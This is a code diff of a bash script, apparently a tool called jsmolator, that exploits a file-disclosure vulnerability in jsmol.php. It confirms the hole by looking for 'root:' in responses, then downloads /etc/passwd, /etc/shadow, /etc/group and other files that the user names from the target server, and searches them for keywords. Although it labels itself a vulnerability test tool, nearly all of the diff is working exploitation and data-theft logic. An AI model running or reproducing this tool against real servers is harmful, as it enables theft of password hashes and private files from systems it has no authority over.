@@ -12,16 +12,47 @@ function forgeRequest {
 function sendRequest {
 	#curl -f : don't chow pages if reponse different from "200 OK"
 	this_forged_request="$1"
-	curl -ks -f --connect-timeout "$curl_ttl" --retry-max-time "$curl_ttl" --expect100-timeout "$curl_ttl" --happy-eyeballs-timeout-ms "$curl_ttl" --retry "$curl_retry" -o "$curl_output_filename" "$this_forged_request"
+	rm -f "$curl_output_filename" 2>/dev/null 1>/dev/null
+	curl -ks -f -A "JSMOLATOR/$script_version (Linux x86_64) (Vulnerability Test Tool) <jsmolator.sh>" --connect-timeout "$curl_ttl" --retry-max-time "$curl_ttl" --expect100-timeout "$curl_ttl" --happy-eyeballs-timeout-ms "$curl_ttl" --retry "$curl_retry" -o "$curl_output_filename" "$this_forged_request"
 	}
 function checkResult {
-	this_check=$(cat "$curl_output_filename" 2>/dev/null | grep "root:")
+	this_check=$(cat "$curl_output_filename" 2>/dev/null | grep --binary-file=text "root:")
 	#this_check=$(cat "$curl_output_filename" 2>&1)
 	if [ ${#this_check} -gt 0 ];then
 		echo -e "OK"
 	else
 		echo -e "KO"
 	fi
+	}
+function checkTarget {
+	this_all_checks_ok='KO'
+	this_return=''
+	this_check_protocol=$(echo "$jsmolphp_url"|egrep -i "^http[s]*://|file://")
+	
+	if [ ${#this_check_protocol} -gt 0 ];then
+		this_check_protocol='OK'
+	else
+		this_return="$this_return\nPotocol missing from target: http://..."
+	fi	
+
+	this_check_jsmolphp_end=$(echo "$jsmolphp_url"|egrep -i "jsmol[.]php$")
+	if [ ${#this_check_jsmolphp_end} -gt 0 ];then
+		this_check_jsmolphp_end='OK'
+	else
+		this_return="$this_return\n/jsmpl.php is missing at the end of the target"
+	fi	
+
+	this_check_uri=$(echo "$jsmolphp_url"|grep -o "/"|sed 's/ //g')
+	if [ ${#this_check_uri} -ge 3 ];then
+		this_check_uri='OK'
+	else
+		this_return="$this_return\nFull jsmol.php URI is required in target."
+	fi
+
+	if [ "$this_check_protocol" = 'OK' ] && [ "$this_check_jsmolphp_end" = 'OK' ] && [ "$this_check_uri" = 'OK' ] ;then
+		this_return='OK'
+	fi
+	echo -e "$this_return"
 	}
 
 function checkFileSize {
@@ -39,7 +70,12 @@ function getFile {
 	this_dest_file="$3"
 	this_forged_request=$(forgeRequest "$this_filename" "$this_payloadtype" )
 	sendRequest "$this_forged_request" 
-	cat "$curl_output_filename" > "$this_dest_file"
+	cat "$curl_output_filename" 2>/dev/null 1>"$this_dest_file"
+	}
+function getFiletype {
+	this_filename="$1"
+	this_filetype=$(file -i "$this_filename"|cut -d '=' -f 2)
+	echo "$this_filetype"
 	}
 function checkFile {
 	this_filename="$1"
@@ -47,6 +83,7 @@ function checkFile {
 	this_forged_request=$(forgeRequest "$this_filename" "$this_payloadtype" )
 	sendRequest "$this_forged_request" 
 	this_check_result=$(checkResult)
+	
 	if [ $this_check_result = "OK" ];then
 		continue_tests='FALSE'
 		is_vuln='TRUE'
@@ -57,11 +94,44 @@ function checkFile {
 		functionnal_payload=''
 	fi
 
+
+	}
+function gotImportantFiles {
+	#convert target domaine to folder
+	this_dl_sub_folder="$1"
+	showTitle "Checking important files" "" "2"
+	for dl_file_primary in ${target_test_files[*]};do
+		dl_filename=$(echo "$dl_file_primary"|sed 's/\//_/g'|sed 's/\.\./parent/g')
+		dl_dest="$download_folder/$this_dl_sub_folder/$dl_filename"
+		showTitle "Checking [$c_submain$dl_file_primary$c_reset$c_main]" "" "3" "NoNL"
+		getFile "$dl_file_primary" "$functionnal_payload" "$dl_dest"
+		check_size=$(checkFileSize "$dl_dest")
+		got_formatted_response=$( binaryToHuman "$check_size" )
+		
+		if [ "$check_size" != "OK" ];then
+			rm -f "$dl_dest"
+			echo -e "$c_error$got_formatted_response$c_reset"
+			sleep $delai_download
+		else
+			if [ "$dl_file_primary" = "/etc/passwd" ];then
+				got_passwd='TRUE'
+			fi
+			if [ "$dl_file_primary" = "/etc/shadow" ];then
+				got_shadow='TRUE'
+			fi
+			if [ "$dl_file_primary" = "/etc/group" ];then
+				got_group='TRUE'
+			fi
+			echo -e "$c_text$got_formatted_response$c_reset"
+			sleep $delai_download
+		fi
+	done
 	}
 function downloadFiles {
 	#convert target domaine to folder
 	this_dl_sub_folder="$1"
-	showTitle "Downloading files into" "$download_folder/$this_dl_sub_folder/" "1"
+	showTitle "Start downloading" "$total_files_to_dl total" "1"
+	echo ''
 	total_files_downloaded=0
 	total_files_being_dl=0
 	for dl_file in ${download_files[*]};do
@@ -83,68 +153,169 @@ function downloadFiles {
 			sleep $delai_download
 		else
 			total_files_downloaded=$(( $total_files_downloaded+1 ))
-			if [ "$dl_file" = "/etc/passwd" ] || [ "$dl_file" = "/etc/passwd-" ];then
-				got_passwd='TRUE'
-			fi
-			if [ "$dl_file" = "/etc/shadow" ] || [ "$dl_file" = "/etc/shadow-" ];then
-				got_shadow='TRUE'
-			fi
-			if [ "$dl_file" = "/etc/group" ] || [ "$dl_file" = "/etc/group-" ];then
-				got_group='TRUE'
-			fi
+			downloaded_files_list="$downloaded_files_list $dl_filename"
+			total_downloaded_files_real_path_list="$total_downloaded_files_real_path_list $dl_file"
+			total_downloaded_files=$(( $total_downloaded_files+1 ))
 			echo -e "$c_text$check_size$c_reset"
 			sleep $delai_download
 		fi
 	done
+	showTitle "Total downloaded" "$total_downloaded_files" "3"
+	}
+function downloadMoreFiles {
+	this_dl_sub_folder="$1"	
+	more_download_files=''
+	if [ "$mode_interact" = 'ON' ];then
+		showTitle "Search for more files? [${c_submain}Y/N$c_reset$c_main]" "" "1" "NoNL"
+		echo -en "$c_warn";
+		read question_search_morefiles
+		if [ "$question_search_morefiles" != 'N' ] || [ "$question_search_morefiles" != 'n' ] || [ "$question_search_morefiles" != 'NO' ] || [ "$question_search_morefiles" != 'no' ];then
+			showTitle "Insert files path? (Example: ${c_submain}/myfolder/myfile.ext$c_reset$c_main)" "" "2" "NoNL"
+			echo -en "$c_warn";
+			read more_download_files
+		fi
+		total_morefiles_to_dl=$(echo "${more_download_files[*]}"|wc -w )
+		if [ "$more_download_files" != '' ];then
+			showTitle "Start downloading" "$total_morefiles_to_dl total" "1"
+			echo ''
+			total_morefiles_downloaded=0
+			total_morefiles_being_dl=0
+			for dl_file in ${more_download_files[*]};do
+				total_morefiles_being_dl=$(( $total_morefiles_being_dl+1 ))
+				dl_short_filename=$(echo "$dl_file"|rev|cut -d '/' -f 1|rev)
+				dl_filename=$(echo "$dl_file"|sed 's/\//_/g'|sed 's/\.\./parent/g')
+				dl_dest="$download_folder/$this_dl_sub_folder/$dl_filename"
+				pct_dl=$(($total_morefiles_being_dl*100/$total_morefiles_to_dl))
+				text_progression="[Progress:$c_submain $pct_dl%$c_reset$c_reset$c_main]"
+				text_downloaded="[Downloaded:$c_submain $total_morefiles_downloaded/$total_morefiles_to_dl$c_reset$c_reset$c_main]"
+				text_file="[File:$c_submain$dl_file$c_reset$c_main]"
+				showTitle "$text_progression$text_downloaded $text_file" "" "2" "NoNL" "XMODE"
+				getFile "$dl_file" "$functionnal_payload" "$dl_dest"
+				check_size=$(checkFileSize "$dl_dest")
+				
+				if [ "$check_size" != "OK" ];then
+					rm -f "$dl_dest"
+					echo -e "$c_error$check_size$c_reset"
+					sleep $delai_download
+				else
+					total_morefiles_downloaded=$(( $total_morefiles_downloaded+1 ))
+					downloaded_files_list="$downloaded_files_list $dl_filename"
+					total_downloaded_morefiles_real_path_list="$total_downloaded_morefiles_real_path_list $dl_file"
+					total_downloaded_files=$(( $total_downloaded_files+1 ))
+					echo -e "$c_text$check_size$c_reset"
+					sleep $delai_download
+				fi
+			done
+			total_files_downloaded=$(( $total_files_downloaded+$total_morefiles_downloaded))
+			total_downloaded_files_real_path_list="$total_downloaded_files_real_path_list $total_downloaded_morefiles_real_path_list "
+			showTitle "Total downloaded" "$total_downloaded_files" "3"
+		else	
+			showTitle "No files inserted" "${c_error}Skip" "3"
+		fi			
+	fi
 	}
 function listDownloadedFiles {
 	this_dl_sub_folder="$1"
 	#listing downloaded files
 	showTitle "Listing downloaded files" "" "1"
 	#ls -Al "$download_folder/$this_dl_sub_folder/"|tail -n +2|egrep -v "^[[space]]*"|sed "s/^/    | /g"
-	filelist=$(ls -A "$download_folder/$this_dl_sub_folder/")
-	for fl in $(echo "$filelist");do
-		showTitle "$fl" "" "2" ""
-		filepath="$download_folder/$this_dl_sub_folder/$fl"
-		filesize=$(getFilesize "$filepath")
-		#showTitle "Filesize" "$c_warn$filesize$c_reset$c_text" "3" ""
-		showTitle "Filesize" "$filesize" "3" ""
-		showTitle "Tag search" "" "3" ""
-		
-		searchTagInFile "$filepath"
-	done
+	#filelist=$(ls -A "$download_folder/$this_dl_sub_folder/")
+	filelist=$downloaded_files_list	
+	if [ ${#filelist} -eq 0 ];then
+		showTitle "Empty list" "${c_error}Nothing was found${c_reset}${c_text}" "2" ""
+	else	
+		this_index=0
+		for fl in $(echo "$filelist");do
+			filepath="$download_folder/$this_dl_sub_folder/$fl"
+			filesize=$(getFilesize "$filepath")
+			this_index2=0
+			for a_path in $(echo "$total_downloaded_files_real_path_list");do
+				if [ $this_index2 -eq $this_index ];then				
+					file_realpath=${a_path}
+				fi
+				this_index2=$(( $this_index2+1 ))
+			done
+			showTitle "$c_submain$file_realpath$c_reset$c_main" "$filesize" "2"
+			this_index=$(( $this_index+1 ))
+		done	
+	fi
+	}
+function searchTagsMode {
+	filelist=$downloaded_files_list	
+	if [ "$mode_tagsearch" = 'ON' ];then
+		showTitle "Tag search" "" "1"
+		if [ ${#filelist} -gt 0 ];then
+			question_search_tags='YES'
+			if [ "$mode_interact" = 'ON' ];then
+				showTitle "Search for tags? [${c_submain}Y/N$c_reset$c_main]" "" "2" "NoNL"
+				echo -en "$c_warn";
+				read question_search_tags				
+			fi
+			if [ "$question_search_tags" != "no" ] && [ "$question_search_tags" != "NO" ] && [ "$question_search_tags" != "n" ] && [ "$question_search_tags" != "N" ];then				
+				showTitle "Tag list" "${tags_checklist[*]}" "2"
+				if [ "$mode_interact" = 'ON' ];then
+					showTitle "Add your tags to the list (separated by spaces)" " " "3" "NoNL"
+					echo -en "$c_warn";
+					read users_more_tags
+					users_more_tags=$(echo "$users_more_tags"|sed "s/[*$]//g")
+					tags_checklist="${tags_checklist[*]} $users_more_tags"
+					showTitle "New tag list" "${tags_checklist[*]}" "2"				
+				fi
+				showTitle "Tag search" "" "2"
+				for fl in $(echo "$filelist");do
+					this_filepath="$download_folder/$this_dl_sub_folder/$fl"
+					searchTagInFile "$this_filepath"
+				done
+				if [ "$mode_debug" = 'ON' ] || [ "$mode_interact" = 'ON' ];then
+					showTitle "Check tag search results before next step..." "" "3" "NoNL"
+					echo -en "$c_warn";read question_check_this 2>/dev/null 1>/dev/null
+				fi
+			fi
+		fi
+	fi
+	}
+function searchTagInFile {
+	this_filename="$1"
+	check_file_type=$(getFiletype "$this_filename")
+	this_short_filename=$(echo "$this_filename"|rev|cut -d'/' -f 1|rev)
+	showTitle "File $c_submain$this_short_filename$c_reset$c_main" "" "3"
+	if [ "$check_file_type" = "binary" ];then
+		showTitle "Binary file" "${c_error}Ignored" "4" ""
+	else
+		for tg in ${tags_checklist[*]};do
+			#showTitle "$c_error#TEST START#$this_filename#$tg#" "" "4"
+			#egrep -I : ignore binary files
+			check_tag=$(cat "$this_filename" 2>/dev/null | egrep -Iin "$tg" 2>/dev/null|egrep -v "$tags_excludelist"|sed 's/[*]/x/g' 2>/dev/null) 2>/dev/null
+			
+			#showTitle "$c_error#TEST END#" "" "4"
+			if [ ${#check_tag} -gt 0 ];then 
+				tag_file="$this_filename.tag"
+				check_tag=$(replaceCharsInTagInFile "$check_tag")
+				echo "$check_tag" > "$tag_file"
+				showTitle "Tag <$c_submain#$tg$c_reset$c_main>" "" "4" ""
+				for tag_line in $( cat "$tag_file");do
+					tag_line=${tag_line//µ£§/ }
+					tag_line_number=$(echo "$tag_line"|cut -d ':' -f 1)
+					tag_line_data=$(echo "$tag_line"|cut -d ':' -f 2-|sed "s/^[ ]*//g"|sed "s/[ ]*$//g")
+					showTitle "${c_submain}Line n°$tag_line_number$c_reset$c_main" "" "5" "NoNL"
+					tag_line_data=$(echo "$tag_line_data"|sed "s/\t/ /g"|sed "s/$tg/\\${c_warn}${tg}\\${c_reset}\\${c_text}/g")
+					echo -e "$c_text$tag_line_data$c_reset"
+				done
+				rm -f "$tag_file" 2>/dev/null 1>/dev/null
+			fi
+		done
+	fi
 	}
 function replaceCharsInTagInFile {
 	this_check_tag="$1"
 	this_check_tag=${this_check_tag//\$/}
 	this_check_tag=${this_check_tag//\*/x}
-	this_check_tag=${this_check_tag//./}
-	this_check_tag=${this_check_tag//\\\n/}
+	#this_check_tag=${this_check_tag//./}
+	#this_check_tag=${this_check_tag//\\\n/}
 	this_check_tag=${this_check_tag//\\\t/ }
 	this_check_tag=${this_check_tag//	/ }
 	this_check_tag=${this_check_tag// /µ£§}
 	echo "$this_check_tag"
-	}
-function searchTagInFile {
-	this_filename="$1"
-	for tg in ${tags_checklist[*]};do
-		check_tag=$(cat "$this_filename" | grep -n "$tg"|sed 's/[*]/x/g') #
-		if [ ${#check_tag} -gt 0 ];then 
-			tag_file="$this_filename.tag"
-			check_tag=$(replaceCharsInTagInFile "$check_tag")
-			echo "$check_tag" > "$tag_file"
-			showTitle "Tag $c_submain#$tg$c_reset$c_main" "" "4" ""
-			for tag_line in $( cat "$tag_file");do
-				tag_line=${tag_line//µ£§/ }
-				tag_line_number=$(echo "$tag_line"|cut -d ':' -f 1)
-				tag_line_data=$(echo "$tag_line"|cut -d ':' -f 2-|sed "s/^[ ]*//g"|sed "s/[ ]*$//g")
-				showTitle "Line n°$c_submain$tag_line_number$c_reset$c_main" "" "5" "NoNL"
-				tag_line_data=$(echo "$tag_line_data"|sed "s/\t/ /g"|sed "s/$tg/\\${c_warn}${tg}\\${c_reset}\\${c_text}/g")
-				echo -e "$c_text$tag_line_data$c_reset"
-			done
-			rm -f "$tag_file" 2>/dev/null 1>/dev/null
-		fi
-	done
 	}
 function getFilesize {
 	this_filename="$1"
@@ -163,11 +334,11 @@ function checkFolders {
 	
 	for a_folder in ${folders_to_check[*]};do
 		if [ ! -d "$a_folder" ];then 
-			showTitle "Creating $c_submain$a_folder$c_reset$c_main" "" "2" "NoNL"
+			showTitle "Creating $c_submain$a_folder$c_reset$c_main" "" "3" "NoNL"
 			mkdir "$a_folder" 
 			echo -e $c_warn"Done"$c_reset
 		else
-			showTitle "Folder $c_submain$a_folder$c_reset$c_main" "Already exists" "2"
+			showTitle "Folder $c_submain$a_folder$c_reset$c_main" "Already exists" "3"
 		fi
 	done
 	}
@@ -185,10 +356,12 @@ function secondsToTime {
 	}
 function binaryToHuman {
 	this_true_or_false="$1"
-	if [ "$this_true_or_false" = "TRUE" ];then
+	if [ "$this_true_or_false" = "TRUE" ] || [ "$this_true_or_false" = "OK" ];then
 		this_yes_or_no="${c_warn}Yes"
+	elif [ "$this_true_or_false" = "FALSE" ] || [ "$this_true_or_false" = "KO" ];then
+		this_yes_or_no="${c_error}No"
 	else
-		this_yes_or_no="${c_error}NO!"
+		this_yes_or_no="${c_warn}$this_true_or_false!"
 	fi
 	echo -e "$this_yes_or_no"
 	}
@@ -207,7 +380,7 @@ function saveToHistory {
 function readFromHistory {
 	this_target_filter="$1"
 	#URL;isVulnerable;PayloadType;gotPasswd;gotShadow;gotGroup;Date;Duration
-	hist_search=$(cat "$history_file" | egrep "$this_target_filter" | tail -n 1)
+	hist_search=$(cat "$history_file" | egrep "$this_target_filter" | tail -n 1) #tail for last scan result
 	echo "$hist_search"
 	}
 function historyData {
